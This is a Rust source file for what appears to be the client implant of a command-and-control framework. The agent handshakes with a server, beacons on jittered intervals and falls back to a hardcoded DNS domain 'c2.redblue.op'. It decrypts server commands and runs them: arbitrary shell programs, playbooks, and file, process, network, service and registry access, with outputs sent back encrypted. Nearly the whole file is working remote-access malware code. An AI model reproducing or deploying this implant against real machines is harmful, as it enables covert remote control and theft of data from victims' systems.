use crate::accessors::{
    file::FileAccessor, network::NetworkAccessor, process::ProcessAccessor,
    registry::RegistryAccessor, service::ServiceAccessor, Accessor,
};
use crate::agent::crypto::AgentCrypto;
use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
use crate::agent::ratchet::{MessageHeader, RatchetState};
use crate::agent::transport::{csprng_u64, dns::DnsTransport, http::HttpTransport, TransportChain};
use crate::playbooks::{Playbook, PlaybookContext, PlaybookExecutor};
use crate::serde_json;
use std::collections::HashMap;
use std::time::Duration;

/// Agent Client
pub struct AgentClient {
    pub config: AgentConfig,
    // Crypto used for initial handshake (X25519)
    pub handshake_crypto: AgentCrypto,
    // Double Ratchet state for session (established after handshake)
    pub ratchet: Option<RatchetState>,
    transport: TransportChain,
    pub session_id: u64,
}

#[derive(Debug, Clone)]
pub struct AgentConfig {
    pub server_url: String,
    pub dns_domain: Option<String>,
    pub interval: Duration,
    pub jitter: f32, // 0.0 - 1.0
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: "http://127.0.0.1:4444".to_string(),
            dns_domain: None,
            interval: Duration::from_secs(60),
            jitter: 0.1,
        }
    }
}

impl AgentClient {
    pub fn new(config: AgentConfig) -> Self {
        let session_id = Self::generate_session_id();

        let mut transport = TransportChain::new()
            .with_auto_fallback(true)
            .with_fallback_threshold(3);

        // Add HTTP transport (primary)
        transport.add_transport(Box::new(HttpTransport::with_url(&config.server_url)));

        // Add DNS transport (fallback) if domain is configured
        if let Some(domain) = &config.dns_domain {
            transport.add_transport(Box::new(DnsTransport::with_domain(domain)));
        } else {
            // Default/Fallback DNS domain for resilience
            transport.add_transport(Box::new(DnsTransport::with_domain("c2.redblue.op")));
        }

        Self {
            config,
            handshake_crypto: AgentCrypto::new(),
            ratchet: None,
            transport,
            session_id,
        }
    }

    /// Start the agent with continuous beaconing loop.
    /// This blocks forever until the agent is terminated.
    pub fn start(&mut self) -> Result<(), String> {
        println!("Agent starting... connecting to {}", self.config.server_url);
        println!("Session ID: {:x}", self.session_id);

        // Initial handshake
        self.perform_handshake_with_retry()?;
        println!("Handshake successful. Session secured with Double Ratchet.");

        // Continuous beacon loop
        let mut consecutive_failures = 0;
        const MAX_FAILURES_BEFORE_REKEY: u32 = 5;

        loop {
            // Sleep with jitter between beacons
            self.sleep_with_jitter();

            // Send beacon
            match self.send_beacon() {
                Ok(()) => {
                    consecutive_failures = 0;
                }
                Err(e) => {
                    consecutive_failures += 1;
                    eprintln!(
                        "Beacon failed ({}/{}): {}",
                        consecutive_failures, MAX_FAILURES_BEFORE_REKEY, e
                    );

                    // After multiple failures, attempt to re-establish session
                    if consecutive_failures >= MAX_FAILURES_BEFORE_REKEY {
                        eprintln!("Too many failures. Attempting session re-establishment...");

                        // Reset session state
                        self.handshake_crypto = AgentCrypto::new();
                        self.ratchet = None;
                        self.session_id = Self::generate_session_id();

                        // Backoff before retry
                        std::thread::sleep(Duration::from_secs(30));

                        match self.perform_handshake_with_retry() {
                            Ok(()) => {
                                println!("Session re-established successfully.");
                                consecutive_failures = 0;
                            }
                            Err(e) => {
                                eprintln!("Failed to re-establish session: {}", e);
                                // Continue trying in the loop
                            }
                        }
                    }
                }
            }
        }
    }

    /// Perform handshake with exponential backoff retry
    fn perform_handshake_with_retry(&mut self) -> Result<(), String> {
        const MAX_RETRIES: u32 = 5;
        let mut retry_delay = Duration::from_secs(2);

        for attempt in 1..=MAX_RETRIES {
            match self.perform_handshake() {
                Ok(()) => return Ok(()),
                Err(e) => {
                    if attempt == MAX_RETRIES {
                        return Err(format!(
                            "Handshake failed after {} attempts: {}",
                            MAX_RETRIES, e
                        ));
                    }
                    eprintln!(
                        "Handshake attempt {}/{} failed: {}. Retrying in {:?}...",
                        attempt, MAX_RETRIES, e, retry_delay
                    );
                    std::thread::sleep(retry_delay);
                    retry_delay = (retry_delay * 2).min(Duration::from_secs(60));
                }
            }
        }
        Err("Handshake failed".to_string())
    }

    pub fn perform_handshake(&mut self) -> Result<(), String> {
        // Payload is just the public key (32 bytes)
        let payload = self.handshake_crypto.public_key.to_vec();
        let tag = [0u8; 16]; // No tag for KE

        // Handshake doesn't use nonce for encryption (it's unencrypted pubkey exchange)
        let beacon = BeaconMessage::new(
            MessageType::KeyExchange,
            self.session_id,
            None,
            None, // No DH public
            None, // No PN
            None, // No N
            payload,
            tag,
        );

        let json = serde_json::to_string(&beacon).map_err(|e| e.to_string())?;

        // Transport chain handles the actual sending
        let response_body = self
            .transport
            .send(json.as_bytes())
            .map_err(|e| format!("Transport error: {}", e))?;

        if response_body.len() != 32 {
            return Err(format!(
                "Invalid server handshake response length: {}",
                response_body.len()
            ));
        }

        let mut server_pub = [0u8; 32];
        server_pub.copy_from_slice(&response_body);

        // Derive shared secret from ECDH
        self.handshake_crypto.derive_session_key(&server_pub);
        let shared_secret = self
            .handshake_crypto
            .session_key
            .ok_or("Failed to derive session key")?;

        // Initialize Double Ratchet as Initiator (Client sends first beacon)
        // Client uses the server's public key as the initial remote key
        self.ratchet = Some(RatchetState::init_initiator(&shared_secret, &server_pub));

        Ok(())
    }

    fn sleep_with_jitter(&self) {
        let base_secs = self.config.interval.as_secs_f32();
        let jitter_amount = base_secs * self.config.jitter;
        let rand_factor = if self.config.jitter > 0.0 {
            let rand = csprng_u64().expect("OS CSPRNG unavailable");
            (rand as f64 / u64::MAX as f64) as f32
        } else {
            0.0
        };
        let offset = (rand_factor * 2.0 - 1.0) * jitter_amount;

        let sleep_secs = (base_secs + offset).max(0.1);
        std::thread::sleep(Duration::from_secs_f32(sleep_secs));
    }

    fn generate_session_id() -> u64 {
        csprng_u64().expect("OS CSPRNG unavailable")
    }

    pub fn send_beacon(&mut self) -> Result<(), String> {
        // Internal message
        let internal_msg = "HEARTBEAT";

        let ratchet = self.ratchet.as_mut().ok_or("Ratchet not initialized")?;

        // Encrypt payload with Ratchet
        // Returns (header, nonce+ciphertext+tag)
        let (header, ciphertext_blob) = ratchet.encrypt(internal_msg.as_bytes())?;

        // Unpack blob: nonce (12) + ciphertext + tag (16)
        if ciphertext_blob.len() < 28 {
            return Err("Ciphertext too short".to_string());
        }
        let nonce: [u8; 12] = ciphertext_blob[..12].try_into().unwrap();
        let split_idx = ciphertext_blob.len() - 16;
        let payload = ciphertext_blob[12..split_idx].to_vec();
        let tag: [u8; 16] = ciphertext_blob[split_idx..].try_into().unwrap();

        let beacon_request = BeaconMessage::new(
            MessageType::Beacon,
            self.session_id,
            Some(nonce),
            Some(header.dh_public),
            Some(header.pn),
            Some(header.n),
            payload,
            tag,
        );

        let json_request = serde_json::to_string(&beacon_request).map_err(|e| e.to_string())?;

        let response_body = self
            .transport
            .send(json_request.as_bytes())
            .map_err(|e| format!("Transport error: {}", e))?;

        // Server should respond with a BeaconMessage containing commands
        let response_beacon: BeaconMessage = match serde_json::from_slice(&response_body) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("Failed to parse server response beacon: {}", e);
                return Err("Invalid server response".to_string());
            }
        };

        // Reconstruct Ratchet Header from response
        let resp_header = MessageHeader {
            dh_public: response_beacon.dh_public.ok_or("Missing dh_public")?,
            pn: response_beacon.pn.ok_or("Missing pn")?,
            n: response_beacon.n.ok_or("Missing n")?,
        };

        // Reconstruct blob: nonce + payload + tag
        let resp_nonce = response_beacon.nonce.ok_or("Missing nonce")?;
        let mut resp_blob = resp_nonce.to_vec();
        resp_blob.extend_from_slice(&response_beacon.payload);
        resp_blob.extend_from_slice(&response_beacon.tag);

        // Decrypt server's payload
        match ratchet.decrypt(&resp_header, &resp_blob) {
            Ok(plaintext_payload) => {
                if !plaintext_payload.is_empty() {
                    let commands: Vec<AgentCommand> =
                        match serde_json::from_slice(&plaintext_payload) {
                            Ok(cmds) => cmds,
                            Err(e) => {
                                eprintln!("Failed to deserialize commands: {}", e);
                                return Err("Invalid commands from server".to_string());
                            }
                        };

                    println!("Received {} commands from server.", commands.len());
                    let mut responses = Vec::new();

                    for cmd in commands {
                        let response = self.execute_command(cmd);
                        responses.push(response);
                    }

                    // Send responses back immediately
                    if !responses.is_empty() {
                        self.send_responses(&responses)?;
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to decrypt server beacon payload: {}", e);
                return Err("Failed to decrypt server response".to_string());
            }
        }

        Ok(())
    }

    fn send_responses(&mut self, responses: &[AgentResponse]) -> Result<(), String> {
        let payload_bytes = serde_json::to_vec(responses).map_err(|e| e.to_string())?;

        let ratchet = self.ratchet.as_mut().ok_or("Ratchet not initialized")?;
        let (header, ciphertext_blob) = ratchet.encrypt(&payload_bytes)?;

        // Unpack blob
        let nonce: [u8; 12] = ciphertext_blob[..12].try_into().unwrap();
        let split_idx = ciphertext_blob.len() - 16;
        let payload = ciphertext_blob[12..split_idx].to_vec();
        let tag: [u8; 16] = ciphertext_blob[split_idx..].try_into().unwrap();

        let beacon = BeaconMessage::new(
            MessageType::Response,
            self.session_id,
            Some(nonce),
            Some(header.dh_public),
            Some(header.pn),
            Some(header.n),
            payload,
            tag,
        );

        let json = serde_json::to_string(&beacon).map_err(|e| e.to_string())?;

        self.transport
            .send(json.as_bytes())
            .map_err(|e| format!("Transport error: {}", e))?;

        Ok(())
    }

    fn execute_command(&self, cmd: AgentCommand) -> AgentResponse {
        println!("Executing command: {} {}", cmd.action, cmd.args.join(" "));

        match cmd.action.as_str() {
            "playbook" => {
                if cmd.args.is_empty() {
                    return AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: Some("Missing playbook argument".to_string()),
                    };
                }

                // Expect arg[0] to be serialized playbook
                let playbook_res: Result<Playbook, _> = serde_json::from_str(&cmd.args[0]);
                match playbook_res {
                    Ok(playbook) => {
                        let mut context = PlaybookContext::new("localhost"); // TODO: Use real target
                        let mut executor = PlaybookExecutor::new();
                        let result = executor.execute(&playbook, &mut context);

                        let output = serde_json::to_string(&result).unwrap_or_default();

                        AgentResponse {
                            command_id: cmd.id,
                            success: result.success,
                            output,
                            error: None,
                        }
                    }
                    Err(e) => AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: Some(format!("Failed to parse playbook: {}", e)),
                    },
                }
            }
            "access" => {
                // Usage: access <accessor_name> <method> [key=value]...
                if cmd.args.len() < 2 {
                    return AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: Some("Usage: access <accessor> <method> [args...]".to_string()),
                    };
                }

                let accessor_name = &cmd.args[0];
                let method = &cmd.args[1];
                let mut args_map = HashMap::new();

                for arg in cmd.args.iter().skip(2) {
                    if let Some((k, v)) = arg.split_once('=') {
                        args_map.insert(k.to_string(), v.to_string());
                    }
                }

                let accessor: Box<dyn Accessor> = match accessor_name.as_str() {
                    "file" => Box::new(FileAccessor::new()),
                    "process" => Box::new(ProcessAccessor::new()),
                    "network" => Box::new(NetworkAccessor::new()),
                    "service" => Box::new(ServiceAccessor::new()),
                    "registry" => Box::new(RegistryAccessor::new()),
                    _ => {
                        return AgentResponse {
                            command_id: cmd.id,
                            success: false,
                            output: String::new(),
                            error: Some(format!("Unknown accessor: {}", accessor_name)),
                        };
                    }
                };

                let result = accessor.execute(method, &args_map);

                if result.success {
                    // Serialize data (Value) to JSON string
                    let json_out = if let Some(data) = result.data {
                        serde_json::to_string(&data).unwrap_or_default()
                    } else {
                        String::new()
                    };

                    AgentResponse {
                        command_id: cmd.id,
                        success: true,
                        output: json_out,
                        error: None,
                    }
                } else {
                    AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: result.error,
                    }
                }
            }
            "shell" | "exec" => {
                if cmd.args.is_empty() {
                    return AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: Some("Missing command".to_string()),
                    };
                }

                let program = &cmd.args[0];
                let args = &cmd.args[1..];

                match std::process::Command::new(program).args(args).output() {
                    Ok(out) => {
                        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                        let combined = format!("{}\n{}", stdout, stderr);

                        AgentResponse {
                            command_id: cmd.id,
                            success: out.status.success(),
                            output: combined.trim().to_string(),
                            error: if out.status.success() {
                                None
                            } else {
                                Some(format!("Exit code: {:?}", out.status.code()))
                            },
                        }
                    }
                    Err(e) => AgentResponse {
                        command_id: cmd.id,
                        success: false,
                        output: String::new(),
                        error: Some(format!("Execution failed: {}", e)),
                    },
                }
            }
            _ => AgentResponse {
                command_id: cmd.id,
                success: false,
                output: String::new(),
                error: Some(format!("Unknown action: {}", cmd.action)),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dummy() {
        assert!(true);
    }
}
